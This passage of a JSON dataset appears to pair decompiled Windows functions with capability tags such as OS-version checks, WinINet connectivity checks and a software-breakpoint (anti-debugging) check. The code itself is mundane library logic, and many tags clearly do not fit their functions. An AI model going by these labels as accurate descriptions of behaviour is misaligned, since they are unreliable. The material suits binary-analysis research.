{\n        puVar14 = unaff_EDI;\n    }\n    *puVar14 = 0;\n    if (0xf < uStack36) {\n        fcn.0041bae1(uStack56);\n    }\n    *in_FS_OFFSET = uStack32;\n    return unaff_ESI;\n}\n",
        "token_count": 4210
    },
    "00406dd0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.00406dd0(uint16_t *param_1, uint16_t *param_2)\n\n{\n    uint16_t uVar1;\n    uint16_t *puVar2;\n    uint16_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    \n    iVar6 = 0;\n    uVar1 = *param_1;\n    puVar2 = param_1;\n    while (uVar1 != 0) {\n        puVar2 = puVar2 + 1;\n        iVar6 = iVar6 + 1;\n        uVar1 = *puVar2;\n    }\n    iVar4 = 0;\n    uVar1 = *param_2;\n    puVar2 = param_2;\n    while (uVar1 != 0) {\n        puVar2 = puVar2 + 1;\n        iVar4 = iVar4 + 1;\n        uVar1 = *puVar2;\n    }\n    if (iVar6 != iVar4) {\n        return 1;\n    }\n    uVar7 = 0;\n    while( true ) {\n        uVar1 = *param_1;\n        uVar5 = 0;\n        puVar2 = param_1;\n        if (uVar1 == 0) {\n            return 0;\n        }\n        do {\n            puVar2 = puVar2 + 1;\n            uVar5 = uVar5 + 1;\n        } while (*puVar2 != 0);\n        if (uVar5 <= uVar7) break;\n        uVar3 = *param_2;\n        if ((0x40 < uVar1) && (uVar1 < 0x5b)) {\n            uVar1 = uVar1 + 0x20;\n        }\n        if ((0x40 < uVar3) && (uVar3 < 0x5b)) {\n            uVar3 = uVar3 + 0x20;\n        }\n        if (uVar1 != uVar3) {\n            return 1;\n        }\n        uVar7 = uVar7 + 1;\n        param_1 = param_1 + 1;\n        param_2 = param_2 + 1;\n    }\n    return 0;\n}\n",
        "token_count": 504
    },
    "00407b30": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.00407b30(uint param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t unaff_EDI;\n    uint *in_FS_OFFSET;\n    uint uVar4;\n    uchar *in_stack_fffffecc;\n    uchar auStack280 [104];\n    uchar *puStack176;\n    uint uStack172;\n    int32_t iStack156;\n    uchar *puStack152;\n    uchar auStack148 [104];\n    uint uStack44;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack12 = *in_FS_OFFSET;\n    uStack4 = 0xffffffff;\n    uStack8 = 0x43aff6;\n    *in_FS_OFFSET = &stack0xfffffff4;\n    iVar1 = fcn.00424f68(param_1, &stack0xfffffee8);\n    if (unaff_EDI == 1) {\n        if (0x80 < iVar1 + 1U) {\n            fcn.00407910();\n        }\n        *(unaff_EDI + iVar1) = 0;\n        uStack16 = 0;\n        uVar4 = 0x407bb2;\n        iVar3 = iVar1;\n        iVar2 = fcn.00424cdc(unaff_EDI, iVar1);\n        if (iVar2 != iVar1) {\n            uVar4 = 0;\n            unaff_EDI = 3;\n            fcn.00425c42(3, 0);\n        }\n        fcn.00403fd0(iVar3, unaff_EDI, uVar4);\n        if (in_stack_fffffecc != &stack0xfffffed0) {\n            fcn.00407900();\n        }\n    }\n    else {\n        iVar1 = iVar1 * 2;\n        puStack152 = NULL;\n        if (iVar1 + 2U < 0x81) {\n            puStack152 = &stack0xffffff6c;\n        }\n        else {\n            fcn.00407910();\n        }\n        *(iVar1 + iStack156) = 0;\n        uStack16 = 1;\n        iVar3 = fcn.00424cdc(iStack156, iVar1);\n        if (iVar3 != iVar1) {\n            fcn.00425c42(3, 0);\n        }\n        fcn.00407a70(uStack172);\n        if (puStack176 != &stack0xffffff54) {\n            fcn.00407900();\n        }\n    }\n    *in_FS_OFFSET = uStack44;\n    return param_1;\n}\n",
        "token_count": 581
    },
    "00408574": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.00408574(int32_t *param_1, int32_t param_2, uint *param_3)\n\n{\n    int32_t iVar1;\n    uint uStack12;\n    \n    if ((param_2 == 0) && (param_3 != NULL)) {\n        uStack12 = 0x80070057;\n        fcn.004010c0();\n    }\n    iVar1 = (***param_3)(param_3, 1);\n    if (iVar1 == 0) {\n        iVar1 = fcn.00401510();\n    }\n    *param_1 = iVar1 + 0x10;\n    fcn.00401410(param_3);\n    fcn.0040b7b0(*param_1, uStack12, param_3);\n    return param_1;\n}\n",
        "token_count": 187
    },
    "00408bc8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00408bc8(int32_t *param_1)\n\n{\n    if (1 < *(*param_1 + -4)) {\n        fcn.00401520(*(*param_1 + -0xc));\n    }\n    return *param_1;\n}\n",
        "token_count": 63
    },
    "00408bef": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00408bef(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint lpVersionInformation;\n    uint var_94h;\n    uint var_88h;\n    uint var_4h;\n    \n    var_4h = *0x44e0fc;\n    puVar2 = &var_94h;\n    for (iVar1 = 0x24; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    lpVersionInformation = 0x94;\n    (*_sym.imp.KERNEL32.dll_GetVersionExA)(&lpVersionInformation);\n    fcn.0040b5c2();\n    return;\n}\n",
        "token_count": 172
    },
    "00408e82": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_48h\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl\nfcn.00408e82(int32_t *arg_8h, int32_t arg_ch, uint noname_2, uint noname_3, uint32_t arg_18h, uint32_t *arg_1ch, \n            uint *arg_20h, uint noname_7, int32_t *arg_28h)\n\n{\n    uint16_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint16_t *puVar4;\n    code *pcVar5;\n    int32_t *piVar6;\n    uint32_t *puVar7;\n    uint *puVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    int32_t *piVar11;\n    uint var_48h;\n    uint *var_44h;\n    uint *var_40h;\n    uint *var_34h;\n    uint var_30h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    puVar7 = arg_1ch;\n    piVar6 = arg_8h;\n    iVar10 = 0;\n    var_30h._0_2_ = 0;\n    if (arg_8h == NULL) {\n        return -0x7ff8ffa9;\n    }\n    if (arg_1ch == NULL) {\n        return -0x7ffdfff8;\n    }\n    uVar2 = arg_1ch[2];\n    if (5 < uVar2) {\n        return -0x7ffdfff2;\n    }\n    arg_8h = NULL;\n    if (arg_1ch[3] != 0) {\n        arg_1ch = arg_1ch[1];\n        do {\n            uVar3 = *arg_1ch;\n            if (uVar2 <= uVar3) {\n                return -0x7ffdfff2;\n            }\n            arg_1ch = arg_1ch + 1;\n            arg_8h = arg_8h + 1;\n            (&var_44h)[uVar3] = *puVar7 + iVar10;\n            iVar10 = iVar10 + 0x10;\n        } while (arg_8h < puVar7[3]);\n    }\n    if (arg_8h < uVar2) {\n        iVar10 = arg_8h * 0x10 + *puVar7;\n        iVar9 = uVar2 - arg_8h;\n        piVar11 = &var_48h + (uVar2 - arg_8h);\n        do {\n            *piVar11 = iVar10;\n            iVar10 = iVar10 + 0x10;\n            piVar11 = piVar11 + -1;\n            iVar9 = iVar9 + -1;\n        } while (iVar9 != 0);\n    }\n    iVar10 = -0x7ffdfffd;\n    if (arg_28h == NULL) {\n        arg_28h = &arg_18h;\n    }\n    if (arg_20h == NULL) {\n        arg_20h = &var_30h;\n    }\n    (*_sym.imp.OLEAUT32.dll_VariantClear)(&var_10h);\n    pcVar5 = _sym.imp.OLEAUT32.dll_VariantTimeToDosDateTime;\n    if (0x12 < arg_ch + 0x139aU) goto code_r0x0040940a;\n    // switch table (19 cases) at 0x40941d\n    switch(*((arg_ch + 0x139aU) * 4 + 0x40941d)) {\n    case 0x408f67:\n        if (puVar7[2] == 1) {\n            iVar10 = (**(*piVar6 + 100))(piVar6, *var_44h, var_44h[1], var_44h[2], var_44h[3]);\n            goto code_r0x0040940a;\n        }\n        break;\n    case 0x408f90:\n        if (puVar7[2] == 2) {\n            if (*var_44h != 3) {\n                iVar10 = (*_sym.imp.OLEAUT32.dll_VariantTimeToDosDateTime)(&var_10h, var_44h, 0, 3);\n                if (iVar10 < 0) goto code_r0x00408fb6;\n                var_44h = &var_10h;\n            }\n            arg_18h = var_44h[2];\n            if (*var_40h != 3) {\n                iVar10 = (*pcVar5)(&var_10h, var_40h, 0, 3);\n                if (iVar10 < 0) {\ncode_r0x00408fe4:\n                    *arg_28h = 1;\n                    goto code_r0x0040940a;\n                }\n                var_40h = &var_10h;\n            }\n            iVar10 = (**(*piVar6 + 0x60))(piVar6, arg_18h, var_40h[2], arg_20h);\n            goto code_r0x0040940a;\n        }\n        break;\n    case 0x409007:\n        if (puVar7[2] == 2) {\n            if (*var_44h != 3) {\n                iVar10 = (*_sym.imp.OLEAUT32.dll_VariantTimeToDosDateTime)(&var_10h, var_44h, 0, 3);\n                if (iVar10 < 0) goto code_r0x00408fb6;\n                var_44h = &var_10h;\n            }\n            iVar10 = (**(*piVar6 + 0x5c))(piVar6, var_44h[2], *var_40h, var_40h[1], var_40h[2], var_40h[3], arg_20h);\n            goto code_r0x0040940a;\n        }\n        break;\n    case 0x409050:\n        if (puVar7[2] == 5) {\n            iVar10 = 0;\n            do {\n                puVar4 = (&var_44h)[iVar10];\n                uVar1 = *puVar4;\n                if (((uVar1 & 0x4000) == 0) || ((uVar1 & 0xf) == 0)) {\n                    *arg_28h = iVar10;\n                    break;\n                }\n                if ((uVar1 & 0xc) == 0) {\n                    iVar9 = *(puVar4 + 4);\n                }\n                else {\n                    (*_sym.imp.OLEAUT32.dll_VariantCopy)(*(puVar4 + 4));\n                    puVar4 = (&var_44h)[iVar10];\n                    **(puVar4 + 4) = 3;\n                    iVar9 = *(puVar4 + 4) + 8;\n                }\n                (&var_20h)[iVar10] = iVar9;\n                iVar10 = iVar10 + 1;\n            } while (iVar10 < 4);\n            iVar10 = (**(*piVar6 + 0x58))\n                               (piVar6, var_20h, var_1ch, var_18h, var_14h, *var_34h, var_34h[1], var_34h[2], var_34h[3]\n                               );\n            goto code_r0x0040940a;\n        }\n        break;\n    case 0x4090c6:\n        if (puVar7[2] == 2) {\n            if (*var_44h != 3) {\n                iVar10 = (*_sym.imp.OLEAUT32.dll_VariantTimeToDosDateTime)(&var_10h, var_44h, 0, 3);\n                if (iVar10 < 0) goto code_r0x00408fb6;\n                var_44h = &var_10h;\n            }\n            iVar10 = (**(*piVar6 + 0x54))(piVar6, var_44h[2], *var_40h, var_40h[1], var_40h[2], var_40h[3]);\n            goto code_r0x0040940a;\n        }\n        break;\n    case 0x409110:\n        if (puVar7[2] == 1) {\n            iVar10 = (**(*piVar6 + 0x50))(piVar6, *var_44h, var_44h[1], var_44h[2], var_44h[3], arg_20h + 2);\ncode_r0x00409133:\n            if (-1 < iVar10) {\n                *arg_20h = 8;\n            }\n            goto code_r0x0040940a;\n        }\n        break;\n    case 0x40914a:\n        iVar10 = (**(*piVar6 + 0x4c))(piVar6, arg_20h);\n        goto code_r0x0040940a;\n    case 0x409158:\n        iVar10 = (**(*piVar6 + 0x48))(piVar6, arg_20h);\n        goto code_r0x0040940a;\n    case 0x409166:\n        if (puVar7[2] == 1) {\n            iVar10 = (**(*piVar6 + 0x44))(piVar6, *var_44h, var_44h[1], var_44h[2], var_44h[3], arg_20h + 2);\n            goto code_r0x00409133;\n        }\n        break;\n    case 0x40918b:\n        if (puVar7[2] == 2) {\n            uVar1 = *var_44h;\n            if (((uVar1 & 0x4000) != 0) && ((uVar1 & 0xc) == 0)) {\n                iVar10 = -0x7ffdfffb;\ncode_r0x00408fb6:\n                *arg_28h = 0;\n                goto code_r0x0040940a;\n            }\n            if (uVar1 == 0x400c) {\n                (*_sym.imp.OLEAUT32.dll_VariantCopy)(var_44h[2]);\n                *var_44h[2] = 8;\n                puVar8 = var_44h[2] + 8;\n            }\n            else if (uVar1 == 0x4008) {\n                puVar8 = var_44h[2];\n            }\n            else {\n                (*_sym.imp.OLEAUT32.dll_VariantCopy)(var_44h);\n                puVar8 = var_44h + 2;\n                *var_44h = 8;\n            }\n            iVar10 = (**(*piVar6 + 0x40))(piVar6, puVar8, *var_40h, var_40h[1], var_40h[2], var_40h[3], arg_20h + 2);\n            goto code_r0x00409201;\n        }\n        break;\n    case 0x409218:\n        if (puVar7[2] == 1) {\n            iVar10 = (**(*piVar6 + 0x3c))(piVar6, *var_44h, var_44h[1], var_44h[2], var_44h[3], arg_20h + 2);\n            goto code_r0x00409133;\n        }\n        break;\n    case 0x409240:\n        if (puVar7[2] == 1) {\n            iVar10 = (**(*piVar6 + 0x38))(piVar6, *var_44h, var_44h[1], var_44h[2], var_44h[3], arg_20h);\n            goto code_r0x0040940a;\n        }\n        break;\n    case 0x409264:\n        if (puVar7[2] == 1) {\n            iVar10 = (**(*piVar6 + 0x34))(piVar6, *var_44h, var_44h[1], var_44h[2], var_44h[3], arg_20h);\n            goto code_r0x0040940a;\n        }\n        break;\n    case 0x409288:\n        if (puVar7[2] == 1) {\n            iVar10 = (**(*piVar6 + 0x30))(piVar6, *var_44h, var_44h[1], var_44h[2], var_44h[3], arg_20h + 2);\n            goto code_r0x00409133;\n        }\n        break;\n    case 0x4092b0:\n        if ((arg_18h & 2) == 0) {\n            if ((arg_18h & 4) == 0) goto code_r0x00409334;\n            if (puVar7[2] == 2) {\n                var_20h = *var_44h;\n                var_1ch = var_44h[1];\n                var_18h = var_44h[2];\n                var_14h = var_44h[3];\n                if (*var_40h != 8) {\n                    iVar10 = (*_sym.imp.OLEAUT32.dll_VariantTimeToDosDateTime)(&var_10h, var_40h, 0, 3);\n                    if (iVar10 < 0) goto code_r0x00408fe4;\n                    var_40h = &var_10h;\n                }\n                iVar10 = (**(*piVar6 + 0x6c))(piVar6, var_20h, var_1ch, var_18h, var_14h, var_40h[2]);\n                goto code_r0x0040940a;\n            }\n        }\n        else if (puVar7[2] == 1) {\n            iVar10 = (**(*piVar6 + 0x2c))(piVar6, *var_44h, var_44h[1], var_44h[2], var_44h[3], arg_20h + 2);\n            goto code_r0x00409133;\n        }\n        break;\n    case 0x409334:\ncode_r0x00409334:\n        if ((arg_18h & 2) == 0) {\n            if ((arg_18h & 4) == 0) goto code_r0x004093b8;\n            if (puVar7[2] == 2) {\n                var_20h = *var_44h;\n                var_1ch = var_44h[1];\n                var_18h = var_44h[2];\n                var_14h = var_44h[3];\n                if (*var_40h != 8) {\n                    iVar10 = (*_sym.imp.OLEAUT32.dll_VariantTimeToDosDateTime)(&var_10h, var_40h, 0, 3);\n                    if (iVar10 < 0) goto code_r0x00408fe4;\n                    var_40h = &var_10h;\n                }\n                iVar10 = (**(*piVar6 + 0x68))(piVar6, var_20h, var_1ch, var_18h, var_14h, var_40h[2]);\n                goto code_r0x0040940a;\n            }\n        }\n        else if (puVar7[2] == 1) {\n            iVar10 = (**(*piVar6 + 0x28))(piVar6, *var_44h, var_44h[1], var_44h[2], var_44h[3], arg_20h + 2);\n            goto code_r0x00409133;\n        }\n        break;\n    case 0x4093b8:\ncode_r0x004093b8:\n        if (puVar7[2] == 1) {\n            iVar10 = (**(*piVar6 + 0x24))(piVar6, *var_44h, var_44h[1], var_44h[2], var_44h[3], arg_20h + 2);\n            goto code_r0x004093fc;\n        }\n        break;\n    case 0x4093dd:\n        iVar10 = (**(*piVar6 + 0x20))(piVar6, arg_20h + 2);\ncode_r0x00409201:\n        if (-1 < iVar10) {\n            *arg_20h = 3;\n        }\n        goto code_r0x0040940a;\n    case 0x4093ef:\n        iVar10 = (**(*piVar6 + 0x1c))(piVar6, arg_20h + 2);\ncode_r0x004093fc:\n        if (-1 < iVar10) {\n            *arg_20h = 9;\n        }\n        goto code_r0x0040940a;\n    }\n    iVar10 = -0x7ffdfff2;\ncode_r0x0040940a:\n    (*_sym.imp.OLEAUT32.dll_VariantCopy)(&var_10h);\n    return iVar10;\n}\n",
        "token_count": 3846
    },
    "00409469": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl fcn.00409469(uint noname_0, int32_t arg_ch, uint32_t arg_10h, uint noname_3, int32_t arg_18h)\n\n{\n    bool bVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint var_1h;\n    \n    uVar3 = 0;\n    if (arg_10h != 0) {\n        do {\n            bVar1 = false;\n            uVar4 = 0;\n            do {\n                iVar2 = (*_sym.imp.KERNEL32.dll_lstrcmpW)(*(arg_ch + uVar3 * 4), *(uVar4 + 0x44d768));\n                if (iVar2 == 0) {\n                    bVar1 = true;\n                    *(arg_18h + uVar3 * 4) = *(uVar4 + 0x44d718);\n                }\n                uVar4 = uVar4 + 4;\n            } while (uVar4 < 0x4c);\n            if (!bVar1) {\n                return 0x80020006;\n            }\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < arg_10h);\n    }\n    return 0;\n}\n",
        "token_count": 302
    },
    "004094ec": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004094ec(int32_t param_1)\n\n{\n    uint uVar1;\n    \n    if (*(param_1 + 0xc) == 0) {\n        return 0;\n    }\n    uVar1 = (**(**(param_1 + 0xc) + 0xc))(*(param_1 + 0xc), 0);\n    return uVar1;\n}\n",
        "token_count": 88
    },
    "00409501": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00409501(int32_t arg_8h, int32_t **arg_ch, int32_t *arg_10h, int32_t **arg_14h)\n\n{\n    int32_t **ppiVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    \n    if ((arg_8h == 0) || (arg_ch == NULL)) {\n        iVar3 = -0x7ff8ffa9;\n    }\n    else if (arg_14h == NULL) {\n        iVar3 = -0x7fffbffd;\n    }\n    else {\n        *arg_14h = NULL;\n        if ((((*arg_10h == 0) && (arg_10h[1] == 0)) && (arg_10h[2] == 0xc0)) && (arg_10h[3] == 0x46000000)) {\ncode_r0x004095b1:\n            piVar4 = arg_ch[1] + arg_8h;\n            (**(*piVar4 + 4))(piVar4);\n            *arg_14h = piVar4;\n            iVar3 = 0;\n        }\n        else {\n            piVar4 = arg_ch[2];\n            while (piVar4 != NULL) {\n                piVar2 = *arg_ch;\n                if ((piVar2 == NULL) ||\n                   (((*piVar2 == *arg_10h && (piVar2[1] == arg_10h[1])) &&\n                    ((piVar2[2] == arg_10h[2] && (piVar2[3] == arg_10h[3])))))) {\n                    if (piVar4 == 0x1) goto code_r0x004095b1;\n                    iVar3 = (*piVar4)(arg_8h, arg_10h, arg_14h, arg_ch[1]);\n                    if (iVar3 == 0) {\n                        return 0;\n                    }\n                    if ((piVar2 != NULL) && (iVar3 < 0)) {\n                        return iVar3;\n                    }\n                }\n                ppiVar1 = arg_ch + 5;\n                arg_ch = arg_ch + 3;\n                piVar4 = *ppiVar1;\n            }\n            iVar3 = -0x7fffbffe;\n        }\n    }\n    return iVar3;\n}\n",
        "token_count": 526
    },
    "00423633": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00423633(int32_t param_1)\n\n{\n    uint uVar1;\n    \n    if (*(param_1 + 4) == 0) {\n        return 0;\n    }\n    uVar1 = fcn.00423609();\n    uVar1 = (*_sym.imp.USER32.dll_DestroyMenu)(uVar1);\n    return uVar1;\n}\n",
        "token_count": 85
    },
    "004096e9": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004096e9(uint *param_1)\n\n{\n    if (param_1[1] != 0) {\n        *(param_1[1] + 0xec) = *param_1;\n        *(param_1[1] + 0xf0) = param_1[2];\n    }\n    return;\n}\n",
        "token_count": 78
    },
    "004265c6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004265c6(int32_t param_1)\n\n{\n    uint uVar1;\n    \n    if (*(param_1 + 4) == 0) {\n        return 0;\n    }\n    uVar1 = fcn.0042659c();\n    uVar1 = (*_sym.imp.GDI32.dll_DeleteObject)(uVar1);\n    return uVar1;\n}\n",
        "token_count": 88
    },
    "00409e0a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00409e0a(uint32_t *param_1, uint32_t param_2, uint32_t param_3)\n\n{\n    if (param_2 < 4) {\n        param_2 = 4;\n    }\n    if (param_3 < 2) {\n        param_3 = 0x40;\n    }\n    param_1[3] = 0;\n    param_1[2] = 0;\n    *param_1 = param_2;\n    param_1[1] = param_3;\n    return;\n}\n",
        "token_count": 128
    },
    "00409e4e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00409e4e(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    \n    if (param_1[3] == 0) {\n        iVar1 = fcn.0041b06a(param_1 + 2, param_1[1], *param_1);\n        iVar3 = param_1[1];\n        piVar2 = iVar1 + 4 + *param_1 * (iVar3 + -1);\n        if (-1 < iVar3 + -1) {\n            do {\n                *piVar2 = param_1[3];\n                param_1[3] = piVar2;\n                piVar2 = piVar2 - *param_1;\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != 0);\n        }\n    }\n    param_1[3] = *param_1[3];\n    return;\n}\n",
        "token_count": 218
    },
    "00409e8f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00409e8f(uint arg_8h)\n\n{\n    uint uVar1;\n    int32_t unaff_EBP;\n    uint32_t arg_8h_00;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.0040bc40(0x443218, 0xc);\n    arg_8h_00 = *(unaff_EBP + 8);\n    if ((*0x4527a8 == 3) && (arg_8h_00 <= *0x452794)) {\n        fcn.0040d40a(4);\n        *(unaff_EBP + -4) = 0;\n        uVar1 = fcn.0040dccd(arg_8h_00);\n        *(unaff_EBP + -0x1c) = uVar1;\n        *(unaff_EBP + -4) = 0xffffffff;\n        fcn.00409f01();\n        if (*(unaff_EBP + -0x1c) != 0) goto code_r0x00409ef8;\n    }\n    if (arg_8h_00 == 0) {\n        arg_8h_00 = 1;\n    }\n    if (*0x4527a8 != 1) {\n        arg_8h_00 = arg_8h_00 + 0xf & 0xfffffff0;\n    }\n    (*_sym.imp.KERNEL32.dll_HeapAlloc)(*0x4527a4, 0, arg_8h_00);\ncode_r0x00409ef8:\n    fcn.0040bc7b();\n    return;\n}\n",
        "token_count": 378
    },
    "00409f48": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00409f48(uint arg_8h)\n\n{\n    int32_t arg_8h_00;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    int32_t arg_ch;\n    uint var_4h;\n    \n    fcn.0040bc40(0x443228, 0xc);\n    arg_ch = *(unaff_EBP + 8);\n    if (arg_ch != 0) {\n        if (*0x4527a8 == 3) {\n            fcn.0040d40a(4);\n            *(unaff_EBP + -4) = 0;\n            arg_8h_00 = fcn.0040d4ee(arg_ch);\n            *(unaff_EBP + -0x1c) = arg_8h_00;\n            if (arg_8h_00 != 0) {\n                fcn.0040d519(arg_8h_00, arg_ch);\n            }\n            *(unaff_EBP + -4) = 0xffffffff;\n            fcn.00409f9b();\n            if (*(unaff_EBP + -0x1c) != 0) goto code_r0x00409fb3;\n            arg_ch = *(unaff_EBP + 8);\n        }\n        (*_sym.imp.KERNEL32.dll_HeapFree)(*0x4527a4, 0, arg_ch);\n    }\ncode_r0x00409fb3:\n    fcn.0040bc7b();\n    return;\n}\n",
        "token_count": 350
    },
    "00409fb9": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_58h\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00409fb9(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint var_58h;\n    uint lpSystemInfo;\n    int32_t var_48h;\n    uint32_t lpBuffer;\n    int32_t var_24h;\n    int32_t var_1ch;\n    uint32_t var_18h;\n    uint var_13h;\n    uint lpflOldProtect;\n    int32_t dwSize;\n    uint32_t lpAddress;\n    \n    fcn.0040a2a0();\n    iVar1 = (*_sym.imp.KERNEL32.dll_VirtualQuery)(&var_58h, &lpBuffer, 0x1c);\n    if (iVar1 != 0) {\n        (*_sym.imp.KERNEL32.dll_GetSystemInfo)(&lpSystemInfo);\n        uVar4 = (~(var_48h - 1U) & &var_58h) - var_48h;\n        uVar3 = ((-(*0x45101c != 1) & 0xfffffff1) + 0x11) * var_48h + var_24h;\n        dwSize = var_48h;\n        if (uVar3 <= uVar4) {\n            lpAddress = uVar4;\n            if (*0x45101c != 1) {\n                lpAddress = var_24h;\n                do {\n                    iVar1 = (*_sym.imp.KERNEL32.dll_VirtualQuery)(lpAddress, &lpBuffer, 0x1c);\n                    if (iVar1 == 0) {\n                        return 0;\n                    }\n                    lpAddress = lpAddress + var_1ch;\n                } while ((var_18h & 0x1000) == 0);\n                lpAddress = lpBuffer;\n                if ((var_13h & 1) != 0) {\n                    return 